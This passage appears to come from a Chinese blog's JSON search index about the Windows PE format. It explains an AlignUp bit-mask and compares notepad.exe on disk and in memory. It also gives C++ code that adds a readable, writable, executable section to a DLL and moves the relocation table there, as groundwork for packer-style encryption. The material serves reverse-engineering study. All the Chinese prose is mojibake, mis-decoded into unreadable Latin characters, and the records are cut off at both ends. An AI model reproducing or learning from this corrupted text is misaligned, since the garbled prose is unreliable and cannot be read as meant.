è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯ç¡®ä¿åœ¨è®¡ç®—å¯¹é½çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœsizeå·²ç»æ˜¯alignmentçš„å€æ•°ï¼Œå®ƒä¿æŒä¸å˜ï¼›å¦‚æœä¸æ˜¯ï¼Œå®ƒä¼šè¢«å¢åŠ åˆ°ä¸‹ä¸€ä¸ªalignmentçš„å€æ•°ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœsizeæ˜¯1023ï¼ˆ0x3FFï¼‰ï¼Œä¸”alignmentæ˜¯1024ï¼ˆ0x400ï¼‰ï¼Œé‚£ä¹ˆsize + alignment - 1çš„ç»“æœæ˜¯0x3FF + 0x3FF = 0x7FEã€‚ alignment - 1ï¼š è¿™ä¸ªè¡¨è¾¾å¼ç”Ÿæˆä¸€ä¸ªæ©ç ï¼Œè¯¥æ©ç çš„æ‰€æœ‰ä½ä½éƒ½æ˜¯1ï¼Œç›´åˆ°alignmentçš„ä½å®½ã€‚ä¾‹å¦‚ï¼Œå¯¹äº1024 (0x400)ï¼Œalignment - 1å°±æ˜¯0x3FFï¼ˆå³äºŒè¿›åˆ¶çš„1111111111ï¼‰ã€‚ ~(alignment - 1)ï¼š å¯¹alignment - 1å–åå¾—åˆ°çš„æ©ç åœ¨ä½ä½æ˜¯0ï¼Œåœ¨é«˜ä½æ˜¯1ã€‚ç»§ç»­ä½¿ç”¨1024ä½œä¸ºä¾‹å­ï¼Œç»“æœå°†æ˜¯FFFFFC00ï¼ˆå¯¹äº32ä½æ“ä½œï¼‰ã€‚è¿™ä¸ªæ©ç ç”¨äºå°†ä»»ä½•æ•°æ¸…é›¶åˆ°æœ€æ¥è¿‘çš„æ›´å¤§çš„alignmentå€æ•°ã€‚ ä½¿ç”¨æ©ç  &amp;ï¼š å°†size + alignment - 1çš„ç»“æœä¸ä¸Šè¿°æ©ç è¿›è¡Œä¸æ“ä½œï¼ˆ&amp;ï¼‰ï¼Œç»“æœå°†æ˜¯æœ€æ¥è¿‘çš„å¤§äºç­‰äºsizeçš„alignmentçš„å€æ•°ã€‚è¿™æ˜¯é€šè¿‡å°†size + alignment - 1çš„ä½ä½æ¸…é›¶å®ç°çš„ã€‚ ç¤ºä¾‹ å‡è®¾size = 1025 (0x401) å’Œ alignment = 1024 (0x400)ï¼š size + alignment - 1 = 1025 + 1023 = 2048 (0x800) ~(alignment - 1) = ~(1023) = FFFFFC00 (size + alignment - 1) &amp; ~(alignment - 1) = 0x800 &amp; FFFFFC00 = 0x800 æ‰€ä»¥ï¼Œå¦‚æœä½ ä¼ å…¥1025ä¸ºsizeå’Œ1024ä¸ºalignmentï¼ŒAlignUpå°†è¿”å›2048ï¼Œè¿™æ˜¯å¤§äº1025çš„æœ€å°çš„1024çš„å€æ•°ã€‚ å¸Œæœ›è¿™æ ·çš„è§£é‡Šæœ‰åŠ©äºç†è§£AlignUpå‡½æ•°çš„å†…éƒ¨é€»è¾‘ï¼å¦‚æœè¿˜æœ‰å…¶ä»–é—®é¢˜ï¼Œè¯·ç»§ç»­æé—®ã€‚"},{"title":"ç»ƒä¹ ","path":"/wiki/PE/ç»ƒä¹ _PE.html","content":"ç”¨åå…­è¿›åˆ¶æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ‰“å¼€ä¸€ä¸ªä½äºç£ç›˜ä¸Šçš„notepad.exeæ–‡ä»¶ï¼Œå†æ‰“å¼€ä¸€ä¸ªåœ¨å†…å­˜ä¸­çš„notepadè¿›ç¨‹ï¼Œè§‚å¯Ÿè¿™ä¸¤ä¸ªæ–‡ä»¶çš„ä¸åŒ è¿‡ç¨‹ç¯å¢ƒï¼šwin7 x86ï¼ŒWinHex_x86ã€‚win10ä¸çŸ¥é“ä¸ºå•¥WinHexï¼ŒOpen RAMæ‰¾ä¸åˆ°notepadæ•°æ®ç»å¤§å¤šæ•°ä¸€æ ·ç£ç›˜ä¸Šçš„notepadèµ·å§‹offsetæ˜¯0ï¼Œå†…å­˜ä¸­çš„æ˜¯D00000hç£ç›˜ä¸Šçš„notepad.exeåœ¨å†…å­˜è¿è¡Œçš„notepad.exeå†…å­˜å ç”¨192KBï¼Œç£ç›˜å ç”¨176KBã€‚å†…å­˜ä¸­å¡«å……çš„0æ›´å¤šï¼Œç¬¬ä¸€ä¸ªèŠ‚æ•°æ®ä»1000hå¼€å§‹ã€‚ç¡¬ç›˜ä¸Šçš„æ˜¯ä»400hå¼€å§‹ã€‚ç£ç›˜ä¸Šçš„notepad.exeåœ¨å†…å­˜è¿è¡Œçš„notepad.exe PEæ–‡ä»¶ä¸ºä»€ä¹ˆè¦åˆ†èŠ‚ï¼Ÿ ç­”æ¡ˆåœ¨ç¨‹åºå¤šæ¬¡è¿è¡Œæ—¶èƒ½å¤Ÿå…±äº«æŸäº›æ•°æ®ï¼Œä»¥æ­¤æ¥èŠ‚çº¦å†…å­˜èµ„æºã€‚ä»¥QQç¨‹åºä¸ºä¾‹ï¼Œå‡è®¾å®ƒåŒ…å«ä¸¤ç§ä¸åŒçš„æ•°æ®èŠ‚ï¼šç¬¬1ä¸ªæ•°æ®èŠ‚ï¼šåªè¯»ç¬¬2ä¸ªæ•°æ®èŠ‚ï¼šå¯è¯»å¯å†™å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡æ‰“å¼€QQæ—¶ï¼ŒQQ.exeä¼šè¢«åŠ è½½åˆ°å…¶4GBçš„è¿›ç¨‹ç©ºé—´å†…ï¼ŒåŒ…å«ä¸Šè¿°ä¸¤ä¸ªèŠ‚ã€‚å¦‚æœç”¨æˆ·æƒ³å†æ¬¡æ‰“å¼€ä¸€ä¸ªQQï¼Œç³»ç»Ÿä¼šå†æ¬¡åŠ è½½QQ.exeã€‚ä½†æ˜¯ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªæ•°æ®èŠ‚æ˜¯åªè¯»çš„ï¼Œç¬¬äºŒä¸ªQQå®ä¾‹æ— éœ€é‡æ–°åŠ è½½è¿™ä¸ªèŠ‚ï¼Œå®ƒå¯ä»¥ä½¿ç”¨å·²ç»åŠ è½½åˆ°å†…å­˜ä¸­çš„ç¬¬ä¸€ä¸ªèŠ‚çš„æ•°æ®ã€‚è¿™æ ·ï¼Œæ— è®ºå¯åŠ¨å¤šå°‘ä¸ªQQå®ä¾‹ï¼Œç¬¬ä¸€ä¸ªæ•°æ®èŠ‚éƒ½åªéœ€åŠ è½½ä¸€æ¬¡ï¼Œå¹¶ä¸”å¯ä»¥è¢«æ‰€æœ‰QQè¿›ç¨‹å…±äº«ã€‚è¿™ç§æ–¹å¼æœ‰æ•ˆåœ°èŠ‚çº¦äº†å†…å­˜çš„ä½¿ç”¨ã€‚ ä½¿ç”¨PE ToolæŸ¥çœ‹ä¸€ä¸ªexeçš„èŠ‚è¡¨ä¿¡æ¯ï¼Œç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æŸ¥çœ‹è¯¥exeèŠ‚æ•°æ®çš„èµ·å§‹åœ°å€å’Œå¤§å°æ˜¯å¦ä¸èŠ‚è¡¨ä¸­çš„å­—æ®µä¸€è‡´ ç­”æ¡ˆæ˜¯ä¸€æ ·çš„ 123"},{"title":"ç§»åŠ¨å„ç§è¡¨","path":"/wiki/PE/ç§»åŠ¨å„ç§è¡¨.html","content":"å‰è¨€ åœ¨ç¼–è¯‘PEæ–‡ä»¶æ—¶ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€äº›å…³é”®çš„è¡¨ï¼Œæ¯”å¦‚å¯¼å…¥è¡¨ã€å¯¼å‡ºè¡¨å’Œé‡å®šä½è¡¨ç­‰ã€‚å½“ç³»ç»ŸåŠ è½½å™¨å°†PEæ–‡ä»¶åŠ è½½åˆ°è¿›ç¨‹ç©ºé—´æ—¶ï¼Œå®ƒéœ€è¦ç”¨åˆ°è¿™äº›è¡¨çš„ä¿¡æ¯æ¥è¿›è¡Œåˆå§‹åŒ–å·¥ä½œã€‚ä¾‹å¦‚ï¼Œç³»ç»ŸåŠ è½½å™¨ä½¿ç”¨é‡å®šä½è¡¨æ¥ä¿®æ­£é‡å®šä½æ•°æ®ï¼Œä½¿ç”¨å¯¼å‡ºè¡¨æ¥ä¿®æ­£å¯¼å…¥è¡¨ä¸­çš„åœ°å€æŒ‡å‘ã€‚ PEæ–‡ä»¶ä¿æŠ¤çš„ä¸€ç§å¸¸è§æ–¹æ³•æ˜¯ä½¿ç”¨â€œå£³â€ã€‚å½“æ‰§è¡Œä¸€ä¸ªè¢«åŠ å£³çš„exeæ–‡ä»¶æ—¶ï¼Œé¦–å…ˆè¿è¡Œçš„æ˜¯å£³çš„ä»£ç ã€‚ä¾‹å¦‚ï¼ŒåŒå‡»ä¸€ä¸ªexeå¯èƒ½ä¼šå¼¹å‡ºä¸€ä¸ªè¦æ±‚è¾“å…¥æ¿€æ´»ç çš„çª—å£ï¼›åªæœ‰åœ¨è¾“å…¥æ­£ç¡®çš„æ¿€æ´»ç åï¼Œç¨‹åºæ‰ä¼šç»§ç»­æ‰§è¡ŒåŸå§‹çš„å…¥å£ç‚¹ï¼ˆOEPï¼‰å¹¶è¿è¡ŒçœŸæ­£çš„ç¨‹åºã€‚ å¦‚æœæƒ³å¯¹ç¨‹åºè¿›è¡Œä¿æŠ¤ï¼Œå¯ä»¥åŠ å¯†exeæ–‡ä»¶ä¸­çš„äºŒè¿›åˆ¶æ•°æ®ã€‚ä½†å¦‚æœç›´æ¥åŠ å¯†æ•´ä¸ªèŠ‚çš„æ•°æ®ï¼Œé‚£ä¹ˆå½“ç³»ç»ŸåŠ è½½å™¨å°è¯•æ ¹æ®æ•°æ®ç›®å½•è¡¨ä¸­çš„RVAåœ°å€å®šä½åˆ°å¯¼å…¥è¡¨ã€å¯¼å‡ºè¡¨ã€é‡å®šä½è¡¨æ—¶ï¼Œå®ƒä¼šé‡åˆ°åŠ å¯†æ•°æ®ï¼Œä»è€Œæ— æ³•å®Œæˆåˆå§‹åŒ–å·¥ä½œã€‚ PEæ–‡ä»¶é€šå¸¸æŒ‰èŠ‚åˆ’åˆ†ï¼Œæ¯ä¸ªèŠ‚æŒ‰å…¶å±æ€§åŒºåˆ†ï¼ŒåŒ…å«æ•°æ®å’Œå¯èƒ½çš„è¡¨ä¿¡æ¯ã€‚æ¢å¥è¯è¯´ï¼Œè¡¨ä¿¡æ¯å’Œæ•°æ®å…±åŒå­˜æ”¾åœ¨èŠ‚ä¸­ï¼Œè¡¨ä¿¡æ¯æ²¡æœ‰å•ç‹¬åˆ†ç¦»å­˜æ”¾ã€‚ä¸ºäº†åœ¨åŠ å¯†æ•°æ®çš„åŒæ—¶ç¡®ä¿ç³»ç»ŸåŠ è½½å™¨ä»èƒ½å¾—åˆ°è¿™äº›è¡¨ä¿¡æ¯ï¼Œå¿…é¡»å°†è¿™äº›è¡¨ä¿¡æ¯ç§»åŠ¨åˆ°æŸä¸ªä½ç½®ï¼Œç„¶åå†å¯¹åŸå§‹æ•°æ®è¿›è¡ŒåŠ å¯†ã€‚ä¾‹å¦‚ï¼Œæ–°å¢ä¸€ä¸ªèŠ‚ï¼Œå°†æ‰€æœ‰éœ€è¦çš„è¡¨ä¿¡æ¯ç§»åŠ¨åˆ°è¿™ä¸ªæ–°èŠ‚ä¸­ã€‚ä¹‹åï¼Œå¯¹åŸå§‹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œæ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­çš„RVAåœ°å€æŒ‡å‘è¡¨ä¿¡æ¯çš„æ–°ä½ç½®ã€‚è¿™æ ·ï¼Œå½“ç³»ç»ŸåŠ è½½å™¨åŠ è½½PEæ–‡ä»¶æ—¶ï¼Œä¾ç„¶å¯ä»¥è®¿é—®åˆ°è¿™äº›è¡¨çš„ä¿¡æ¯ã€‚å› æ­¤ï¼Œå­¦ä¹ å¦‚ä½•ç§»åŠ¨è¿™äº›è¡¨æ˜¯æŒæ¡ç¨‹åºåŠ å¯†/è§£å¯†æŠ€æœ¯çš„åŸºç¡€ã€‚ å¯¹PEæ–‡ä»¶åŠ å¯†æ˜¯æŒ‡å¯¹èŠ‚æ•°æ®åŠ å¯†ï¼ŒPEå¤´éƒ¨çš„å­—æ®µä¸èƒ½åŠ å¯†ï¼ˆå¯ä»¥å˜å½¢ï¼Œå‚è€ƒtinypeï¼‰ï¼Œè¿™äº›å­—æ®µç³»ç»ŸåŠ è½½å™¨è¦ç”¨ã€‚ ç§»åŠ¨é‡å®šä½è¡¨ è¦æ‹·è´çš„å†…å®¹æœ‰ï¼šæ‰€æœ‰é‡å®šä½å— ç»Ÿè®¡æ•´ä¸ªé‡å®šä½å—çš„å¤§å°ï¼Œç„¶åæ‹·è´åˆ°æ–°èŠ‚èµ·å§‹ä½ç½® æ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­é‡å®šä½è¡¨RVAåœ°å€çš„æŒ‡å‘ ç¨‹åºæµç¨‹è®¾è®¡ï¼š è·å¾—dllæ–‡ä»¶çš„m_lpFileBufferæ–‡ä»¶å†…å­˜æ˜ åƒï¼ˆæœªæ‹‰ä¼¸ï¼‰ï¼Œè·å–ç›¸å…³PEæŒ‡é’ˆ å¯¹m_lpFileBufferæ–°å¢å¤§å°ä¸º0x2000çš„èŠ‚ï¼Œè¿”å›å‡ºlpNewBufferï¼ˆæœªæ‹‰ä¼¸ï¼‰ åœ¨lpNewBufferä¸Šç§»åŠ¨é‡å®šä½æ•°æ®åˆ°æ–°èŠ‚ å…·ä½“åšæ³•æ˜¯ï¼š æŒ‡å‘é‡å®šä½å—åï¼Œå¾ªç¯éå†å¾—åˆ°é‡å®šä½å—çš„å¤§å°ï¼ˆåŒ…æ‹¬ç»“å°¾çš„8å­—èŠ‚å…¨0ç»“æ„ä½“ï¼‰ æ‹·è´åˆ°æ–°èŠ‚ æ›´æ–°æ•°æ®ç›®å½•é¡¹ä¸­é‡å®šä½è¡¨çš„RVAåœ°å€æŒ‡å‘ å°†lpNewBufferå­˜ç›˜ æ£€éªŒåŠæ³•ï¼šBeyond Compareæ¯”å¯¹ä¸¤ä¸ªæ–‡ä»¶çš„åå…­è¿›åˆ¶ æ›´ä¸¥è°¨çš„è¯è¦ä¿®æ”¹ImageBaseçœ‹ç§»åŠ¨åçš„dllæ–‡ä»¶èƒ½å¦æ­£å¸¸ä½¿ç”¨ã€‚ä½†å› ä¸ºç§»åŠ¨é‡å®šä½è¡¨æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œå°±æ˜¯ç”¨BCå¯¹æ¯”ä¸‹åå…­è¿›åˆ¶ã€‚ æµ‹è¯•å‡½æ•° å¤§è‡´æµç¨‹12345678910111213141516171819202122232425262728293031323334353637//æµ‹è¯•ç§»åŠ¨é‡å®šä½è¡¨int TestRemoveRelocationTable()&#123; //å†™æ­»çš„ï¼Œæ–¹ä¾¿æµ‹è¯•ç”¨ PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyTest_VC.dll&quot;); //VCçš„ //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VSçš„ if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; //æ–°å¢èŠ‚ LPVOID lpNewBuffer = PEFile.AddANewSection(0x2000); //æ–°èŠ‚ç›´æ¥0x2000ï¼Œä¹Ÿå¯ä»¥å…ˆç®—ä¸€éï¼ŒæŒ‰éœ€æ–°å¢èŠ‚çš„å¤§å° if (!lpNewBuffer) &#123; return 1; &#125; INVOKE_ON_EXIT([&amp;] &#123; delete[] lpNewBuffer; &#125;); printf(&quot;[+] AddANewSection_ForFileBuffer successfully. &quot;); //ç§»åŠ¨é‡å®šä½å—åˆ°æ–°èŠ‚ if (!PEFile.RemoveReloactionTableToTheNewSection(lpNewBuffer)) &#123; return 1; &#125; printf(&quot;[+] RemoveReloactionTableToTheNewSection successfully. &quot;); //å­˜ç›˜ if (!PEFile.SaveUnstretchedPEToDisk(lpNewBuffer,&quot;ReloactionTableRemoved&quot;)) &#123; return 1; &#125; printf(&quot;[+] SaveUnstretchedPEToDisk successfully. &quot;); return 0;&#125; å…·ä½“å®ç° æ–°å¢èŠ‚AddANewSectionç§»åŠ¨é‡å®šä½è¡¨åˆ°æ–°èŠ‚è¾…åŠ©å‡½æ•°è®¡ç®—é‡å®šä½å—çš„å¤§å°CalculateTotalRelocationSizeè¿™é‡Œå°±æ˜¯ç®€å•åˆ¤æ–­ç°æœ‰èŠ‚è¡¨åæ˜¯å¦å¤Ÿ80ä¸ªå­—èŠ‚ï¼Œæ²¡è€ƒè™‘ç©ºé—´ä¸å¤Ÿæ—¶NTå¤´ä¸Šç§»çš„æ“ä½œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566LPVOID PEManipulator::AddANewSection(DWORD dwNewSectionSize)&#123; //1ã€åˆ¤æ–­ç°æœ‰çš„èŠ‚è¡¨åæ˜¯å¦æœ‰è¶³å¤Ÿçš„ç©ºé—´æ–°æ·»åŠ ä¸€ä¸ªèŠ‚è¡¨ // è®¡ç®—å„ä¸ªéƒ¨åˆ†çš„å¤§å° DWORD SizeDos = m_DosHdr-&gt;e_lfanew; // DOSå¤´çš„å¤§å°ï¼ˆDOS MZ+DOS Stubï¼‰ DWORD SizeNt = sizeof(m_NtHdr-&gt;Signature) + IMAGE_SIZEOF_FILE_HEADER + m_PeHdr-&gt;SizeOfOptionalHeader; //NTå¤´çš„æ€»å¤§å° DWORD SizeSection = m_PeHdr-&gt;NumberOfSections * sizeof(IMAGE_SECTION_HEADER); //èŠ‚è¡¨çš„æ€»å¤§å° DWORD dwAvailableSpace = m_OptionalPeHdr-&gt;SizeOfHeaders //SizeOfHeaders-ä¸Šé¢ä¸‰éƒ¨åˆ†ä¹‹å’Œ - SizeDos - SizeNt - SizeSection; printf(&quot; [+] Available space after the last section header: %lu bytes &quot;, dwAvailableSpace); if (dwAvailableSpace &lt; 80) // ç©ºé—´ä¸å¤Ÿæ”¾ä¸¤ä¸ªèŠ‚è¡¨ï¼Œåˆ™é€€å‡º è¿™é‡Œä¸è€ƒè™‘NTå¤´ä¸Šç§» &#123; printf(&quot; [!] Not enough space to add a new section header. Required: 80 bytes, available: %lu bytes. &quot;, dwAvailableSpace); return nullptr; &#125; //2ã€ç”³è¯·æ–°ç©ºé—´ï¼Œå°†åŸbufferå†…å®¹æ‹·è¿‡å» DWORD dwNewBufferSize = m_OptionalPeHdr-&gt;SizeOfImage + AlignUp(dwNewSectionSize, m_OptionalPeHdr-&gt;SectionAlignment); //æ–°Bufferçš„å¤§å°=åŸBufferçš„SizeOfImage + æŒ‰å†…å­˜å¯¹é½åçš„dwNewSectionSize LPVOID lpNewBuffer = new BYTE[dwNewBufferSize](); //since C++11 ,it&#x27;s ok printf(&quot;[+] new for NewBuffer successfully. &quot;); memcpy(lpNewBuffer, m_lpFileBuffer, CalculateUnstretchedPESize(m_lpFileBuffer)); //è·å–NewBufferä¸­ç›¸å…³çš„PEæŒ‡é’ˆ auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer); auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer); auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer); if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return nullptr; &#125; // 3ã€ä¿®æ”¹ç›¸å…³å­—æ®µ PIMAGE_SECTION_HEADER pSecHdrToLastSection = pSecHdr_NewBuffer + (pPeHdr_NewBuffer-&gt;NumberOfSections - 1); //æœ€åä¸€ä¸ªèŠ‚è¡¨çš„èŠ‚è¡¨æŒ‡é’ˆ // ï¼ˆ1ï¼‰æ–°èŠ‚è¡¨ // å®šä¹‰ä¸€ä¸ªæ–°èŠ‚è¡¨ï¼Œå¹¶å¡«å……å„ä¸ªå­—æ®µ IMAGE_SECTION_HEADER NewSectionTable = &#123; 0 &#125;; memcpy(NewSectionTable.Name, &quot;.NewSec&quot;, 8); // æ³¨æ„ï¼šæœ€å¤š8ä¸ªå­—ç¬¦ï¼Œä¸å«NULLç»ˆæ­¢ç¬¦ // NewSectionTable.Name = &quot;.NewSec&quot;; // æ ¹æ®å‚æ•°æ¥ç®— NewSectionTable.Misc.VirtualSize = dwNewSectionSize; NewSectionTable.VirtualAddress = pOptionalPeHdr_NewBuffer-&gt;SizeOfImage; NewSectionTable.SizeOfRawData = AlignUp(dwNewSectionSize, pOptionalPeHdr_NewBuffer-&gt;FileAlignment); NewSectionTable.PointerToRawData = pSecHdrToLastSection-&gt;PointerToRawData + pSecHdrToLastSection-&gt;SizeOfRawData; NewSectionTable.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE; //è¯¥å—åŒ…å«æ‰§è¡Œä»£ç ï¼Œå¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œ // å°†æ–°èŠ‚è¡¨å†…å®¹çƒ¤åˆ°NewBufferç°æœ‰èŠ‚è¡¨çš„æœ«å°¾ PIMAGE_SECTION_HEADER pNewSection = pSecHdr_NewBuffer + pPeHdr_NewBuffer-&gt;NumberOfSections; memcpy(pNewSection, &amp;NewSectionTable, sizeof(IMAGE_SECTION_HEADER)); //å°†æ–°å¢çš„èŠ‚è¡¨è¿½åŠ åˆ°æœ€åä¸€ä¸ªèŠ‚è¡¨åé¢ memset(pNewSection + 1, 0, sizeof(IMAGE_SECTION_HEADER)); //å†æ·»åŠ ä¸€ä¸ªå…¨ä¸º0çš„èŠ‚è¡¨æ”¶å°¾ï¼Œä½œä¸ºç»“æŸæ ‡å¿— // ï¼ˆ2ï¼‰æ›´æ–°èŠ‚è¡¨æ•°é‡ ++pPeHdr_NewBuffer-&gt;NumberOfSections; //ï¼ˆ3ï¼‰æ›´æ–°SizeOfImageçš„å¤§å° pOptionalPeHdr_NewBuffer-&gt;SizeOfImage += AlignUp(dwNewSectionSize, pOptionalPeHdr_NewBuffer-&gt;SectionAlignment); printf(&quot; [+] A new section has been added successfully. &quot;); return lpNewBuffer;&#125;1234567891011121314151617181920212223242526272829303132333435363738394041BOOL PEManipulator::RemoveReloactionTableToTheNewSection(LPVOID lpNewBuffer)&#123; //è·å–NewBufferä¸­ç›¸å…³çš„PEæŒ‡é’ˆ auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer); auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer); auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer); if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE; &#125; // è®¡ç®—é‡å®šä½è¡¨çš„æ€»å¤§å° DWORD dwRelocSize = CalculateTotalRelocationSize(lpNewBuffer); if (dwRelocSize == 0) &#123; printf(&quot; [-] Failed to calculate relocation size or no relocation data present. &quot;); return FALSE; &#125; // è·å–é‡å®šä½è¡¨æŒ‡é’ˆ auto pBaseReloc = (PIMAGE_BASE_RELOCATION)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_BASERELOC, lpNewBuffer); if (!pBaseReloc) &#123; printf(&quot; [-] No Base Relocation Table found after size calculation. &quot;); return FALSE; &#125; // ç¡®å®šæ–°èŠ‚çš„ä½ç½®å’Œå¤§å° PIMAGE_SECTION_HEADER pNewSection = &amp;pSecHdr_NewBuffer[pPeHdr_NewBuffer-&gt;NumberOfSections - 1]; DWORD dwNewRelocTableFOA = pNewSection-&gt;PointerToRawData; // å¤åˆ¶é‡å®šä½è¡¨åˆ°æ–°èŠ‚ memcpy((PBYTE)lpNewBuffer + dwNewRelocTableFOA, pBaseReloc, dwRelocSize); // æ›´æ–°æ•°æ®ç›®å½•é¡¹ä¸­é‡å®šä½è¡¨çš„RVAåœ°å€æŒ‡å‘ pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = pNewSection-&gt;VirtualAddress; printf(&quot; [+] Relocation table moved successfully to new section. &quot;); return TRUE;&#125;è€ƒè™‘åˆ°æ•°æ®ç›®å½•è¡¨ä¸­çš„Sizeå€¼å¯èƒ½ä¸å‡†ï¼Œæ‰€ä»¥è‡ªå·±å†™ç¨‹åºç®—ä¸€éé‡å®šä½å—çš„å¤§å°ã€‚è®¡ç®—åå¯ä»¥é¡ºä¾¿æ‰“å°å¯¹æ¯”ä¸‹è¿™ä¸¤ä¸ªå€¼çœ‹ä¸‹æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚ è®¡ç®—æ–¹æ³•ï¼šéå†é‡å®šä½å—ï¼Œå°†æ‰€æœ‰SizeOfBlockç›¸åŠ ã€‚å‡ºå¾ªç¯åï¼Œè¿˜è¦æ‰‹åŠ¨å†åŠ 8å­—èŠ‚ç®—ä¸Šç»“å°¾çš„å…¨0ç»“æ„ä½“çš„å¤§å°ï¼Œå› ä¸ºç»“æŸæ ‡è®°é‚£ä¸ªç»“æ„ä½“çš„SizeOfBlockæ˜¯0ã€‚ 1234567891011121314151617181920212223242526DWORD PEManipulator::CalculateTotalRelocationSize(LPVOID lpBuffer)&#123; auto pBaseReloc = (PIMAGE_BASE_RELOCATION)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_BASERELOC, lpBuffer); if (!pBaseReloc) &#123; printf(&quot; [-] No Base Relocation Table found. &quot;); return 0; &#125; DWORD dwTotalSize = 0; while (pBaseReloc-&gt;SizeOfBlock) &#123; dwTotalSize += pBaseReloc-&gt;SizeOfBlock; pBaseReloc = (PIMAGE_BASE_RELOCATION)((DWORD)pBaseReloc + pBaseReloc-&gt;SizeOfBlock); &#125; // æ·»åŠ æœ«å°¾8å­—èŠ‚ç»“æ„ä½“çš„å¤§å° dwTotalSize += sizeof(IMAGE_BASE_RELOCATION); // æ‰“å°ä¿¡æ¯ printf(&quot; [+] Calculated Total Relocation Size: 0x%X bytes &quot;, dwTotalSize); printf(&quot; [+] Data Directory Reported Size: 0x%X bytes &quot;, ((PIMAGE_OPTIONAL_HEADER32)GetOptionPeHeaders(lpBuffer))-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size); return dwTotalSize;&#125; ä¸Šé¢ä»£ç æœ€åä¸¤è¡Œæ‰“å°äº†è‡ªå·±ç®—çš„å¤§å°å’Œæ•°æ®ç›®å½•è¡¨ä¸­çš„Sizeç”¨äºè§‚å¯Ÿå¯¹æ¯” éå†SizeOfBlock+8å­—èŠ‚çš„å¤§å° æ•°æ®ç›®å½•è¡¨ä¸­é‡å®šä½è¡¨Sizeçš„å¤§å° è¿è¡Œè¾“å‡º12[+] Calculated Total Relocation Size: 0x13CC bytes[+] Data Directory Reported Size: 0x13C4 bytes ä»£ç ç®—çš„ç›¸æ¯”æ•°æ®ç›®å½•è¡¨ä¸­Sizeå¤š8å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´æ•°æ®ç›®å½•è¡¨ä¸­çš„Sizeæ˜¯æ²¡ç®—ä¸Šç»“å°¾çš„8å­—èŠ‚ç»“æ„ä½“çš„å¤§å°ã€‚ è¿è¡Œç»“æœ VCçš„dllVSçš„dll PEæ–‡ä»¶çš„å·®å¼‚æ˜¯ï¼š åŸdllæ–‡ä»¶ æ–°dllæ–‡ä»¶ èŠ‚è¡¨æ•°é‡ 5 6 SizeOfImage 39000h 3B000h æ•°æ®ç›®å½•è¡¨ä¸­é‡å®šä½è¡¨.RVA 37000h 39000h æ–°èŠ‚çš„èŠ‚è¡¨ä¿¡æ¯ ç”¨LordPEçœ‹åŸdllä¸­é‡å®šä½å—æ•°æ®ï¼Œåœ¨æ–°dllä¸­çœ‹åˆ°è¿™äº›é‡å®šä½å—æ•°æ®è¢«ç§»åˆ°äº†æ–°èŠ‚ä¸­ PEæ–‡ä»¶çš„å·®å¼‚æ˜¯ï¼š åŸdllæ–‡ä»¶ æ–°dllæ–‡ä»¶ èŠ‚è¡¨æ•°é‡ 9 Ah SizeOfImage 20000h 22000h æ•°æ®ç›®å½•è¡¨ä¸­é‡å®šä½è¡¨.RVA 1F000h 20000h æ–°èŠ‚çš„èŠ‚è¡¨ä¿¡æ¯ ç”¨LordPEçœ‹åŸdllä¸­é‡å®šä½å—æ•°æ®ï¼Œåœ¨æ–°dllä¸­çœ‹åˆ°è¿™äº›é‡å®šä½å—æ•°æ®è¢«ç§»åˆ°äº†æ–°èŠ‚ä¸­ ç§»åŠ¨å¯¼å‡ºè¡¨ è¦æ‹·è´çš„å†…å®¹æœ‰ï¼š å‡½æ•°åœ°å€è¡¨ æ— éœ€æ‹·è´è¡¨ä¸­åœ°å€æ‰€æŒ‡å‘çš„å‡½æ•°å†…å®¹ã€‚è®©ç³»ç»ŸåŠ è½½å™¨åŠ è½½PEæ—¶èƒ½é€šè¿‡è¿™å¼ åœ°å€è¡¨å¾—åˆ°å‡½æ•°åœ°å€å³å¯ï¼ŒæŸ¥å‡½æ•°åœ°å€è¿™ä¸ªè¿‡ç¨‹å’Œå‡½æ•°åœ°å€æŒ‡å‘çš„å†…å®¹æ— å…³ åºå·è¡¨ åç§°è¡¨ï¼Œåç§°è¡¨ä¸­æ¯ä¸ªæ¡ç›®æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸² 